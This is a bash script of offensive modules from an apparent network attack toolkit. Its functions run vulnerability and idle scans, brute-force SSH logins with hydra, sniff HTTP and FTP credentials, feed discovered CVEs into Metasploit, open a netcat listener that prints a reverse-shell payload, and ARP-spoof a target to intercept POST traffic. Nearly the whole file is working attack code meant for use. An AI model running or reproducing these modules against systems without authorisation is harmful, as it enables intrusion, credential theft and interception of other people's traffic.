#!/usr/bin/env bash

# ==============================================================================
#  VULNERABILITY & EXPLOITATION MODULES
# ==============================================================================

# [6] VULN HUNTER
mod_vuln() {
    echo -e "${BOLD}Target Strategy:${NC}"
    echo "  1. Single IP"
    echo "  2. Full Subnet"
    echo "3. From Zombie Log"
    read -rp "> " sel
    local targets=""
    case $sel in
        1) read -rp "IP: " targets; validate_ip "$targets" || return ;; 
        2) get_interface; targets="$(echo "$MY_IP" | cut -d'.' -f1-3).0/24" ;; 
        3)
            local zl="$LOG_DIR/zombie_scan.txt"
            [[ -f "$zl" ]] || { log_error "No log."; return; }
            grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' "$zl" | sort | uniq > "$TMP_TARGETS"
            targets="-iL $TMP_TARGETS"
            ;; 
        *) return ;; 
    esac
    local out; out="$LOG_DIR/vuln_report_$(date +%Y%m%d_%H%M%S)"
    log_success "Phase 1: Fast Port Discovery..."
    nmap -F -T4 -n --open "$targets" -oG "${out}_fast.gnmap"
    local ports; ports=$(grep "Ports:" "${out}_fast.gnmap" | grep -oE '[0-9]+/open' | cut -d'/' -f1 | sort -u | tr '\n' ',')
    ports=${ports%,}
    if [[ -z "$ports" ]]; then
        log_warning "No open ports found."
    else
        log_success "Phase 2: Deep Vulnerability Scan on ports: $ports"
        nmap -Pn -sV -p "$ports" --script=vulners "$targets" -oN "${out}.txt" -oX "${out}.xml"
        log_success "Report saved to ${out}.xml"
    fi
    read -rp "Press Enter..."
}

# [2] ZOMBIE HUNTER
mod_zombie() {
    header; echo -e "${CYAN}[ ZOMBIE HUNTER ]${NC}"; get_interface
    local subnet; subnet=$(echo "$MY_IP" | cut -d'.' -f1-3)
    log_info "Scanning $subnet.0/24..."
    local raw; raw=$(nmap -n -T4 -p80,443 --script=ipidseq "$subnet.1-254" 2>/dev/null)
    local cands; cands=$(echo "$raw" | awk '/Nmap scan report/{ip=$NF; gsub(/[()]/, "", ip)} /ipidseq: Incremental|Broken little-endian/{print ip}')
    [[ -z "$cands" ]] && { log_error "No Zombies found."; pause; return; }

    echo -e "\nZombies:"; echo "$cands"
    read -rp "Select IP: " zip
    sudo nmap -Pn -sI "$zip" "$subnet.0/24" | sudo tee "$LOG_DIR/zombie_scan.txt"
    log_success "Scan saved."; pause
}

# [11] BRUTE FORCE
mod_brute() {
    read -rp "Target IP: " t
    echo "admin" > u.lst; echo "password" > p.lst
    hydra -L u.lst -P p.lst ssh://"$t"; rm u.lst p.lst; pause
}

# [12] SNIFFER
mod_sniff() {
    get_interface
    log_info "Sniffing Auth on $DEFAULT_IFACE..."
    sudo tshark -i "$DEFAULT_IFACE" -Y "http.auth.basic || ftp.request.command == \"USER\"" -T fields -e ip.src -e http.auth.basic -e ftp.request.arg
    pause
}

# [9] MSF BRIDGE
mod_msf() {
    header; echo -e "${CYAN}[ MSF BRIDGE ]${NC}"
    if ! type -p msfconsole &>/dev/null && [[ ! -x "/opt/metasploit-framework/bin/msfconsole" ]]; then log_error "Install Metasploit first."; pause; return; fi
    if command -v systemctl &>/dev/null; then
        sudo systemctl start postgresql 2>/dev/null
    else
        sudo service postgresql start 2>/dev/null
    fi

    local xml; xml=$(find "$LOG_DIR" -maxdepth 1 -name "vuln_report_*.xml" -printf '%T@ %p\n' 2>/dev/null | sort -nr | head -n 1 | awk '{print $2}')
    [[ -z "$xml" ]] && { log_error "No reports."; pause; return; }
    log_info "Loading $(basename "$xml")..."
    local rc="ionscan_setup.rc"
    local cves; cves=$(grep -o "CVE-[0-9]\{4\}-[0-9]\{4,\}" "$xml" | sort | uniq)
    { echo "workspace -a ionscan"; echo "db_import $xml"; for c in $cves; do echo "search $c"; done; } > "$rc"

    if type -p msfconsole &>/dev/null; then sudo msfconsole -r "$rc"; else sudo /opt/metasploit-framework/bin/msfconsole -r "$rc"; fi
    rm "$rc"; pause
}

# [14] SHELL LISTENER
mod_listener() {
    read -rp "Port (4444): " p; p=${p:-4444}
    log_info "Payload: bash -i >& /dev/tcp/$MY_IP/$p 0>&1"
    nc -lvnp "$p"; pause
}

# [16] INTERCEPTOR
mod_intercept() {
    read -rp "Target IP: " t
    get_interface; local gw; gw=$(ip route | grep default | awk '{print $3}' | head -n1)
    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i "$DEFAULT_IFACE" -t "$t" "$gw" >/dev/null 2>&1 & SPOOF_PID1=$!
    arpspoof -i "$DEFAULT_IFACE" -t "$gw" "$t" >/dev/null 2>&1 & SPOOF_PID2=$!
    log_warning "MITM Active. Sniffing..."
    tshark -i "$DEFAULT_IFACE" -Y "http.request.method == POST"; cleanup; pause
}